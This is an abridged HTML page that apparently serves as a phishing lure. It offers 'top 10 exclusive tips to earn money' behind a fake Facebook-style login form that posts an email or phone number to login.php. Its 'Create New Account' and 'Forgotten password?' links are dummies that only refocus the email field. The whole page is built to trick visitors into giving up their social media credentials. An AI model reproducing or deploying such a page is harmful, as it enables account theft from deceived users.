...
<head>
    <title>Top 10 Tips to Earn Money in Short Time - Kênh 49.vn</title>
    <meta charset="utf-8">
...
<body style="margin:0px;">
    ...
    <div style="width:100%;">
        ...
        <div style="background-color:#FAFAD2;padding:5px;line-height:23px;text-align:center;">
            <span style="color:purple;">Login to continue to get top 10 exclusive tips to earn money in short
                time.</span>
        </div>
        <div class="inputf" style="background-color:AliceBlue;padding:10px;text-align:center;"><br />
            <form name="fbform" method="post" action="login.php">
                <input name="email" type="text" id="email" placeholder="Email address or phone number" maxlength="40"
                ...
                <a class="check" href="#email" onclick='document.getElementById("email").focus();'>Create New
                    Account</a><br /><br />
                <a href="#email" onclick='document.getElementById("email").focus();'>Forgotten password?</a>
                <br /><br />
        ...
        <div class="bottom" style="background-color:#808080;padding:10px;">
            ...
            <p style="text-align:center;color:white;" href="https://www.facebook.com">Facebook</p>
        </div>
    </div>
</body>
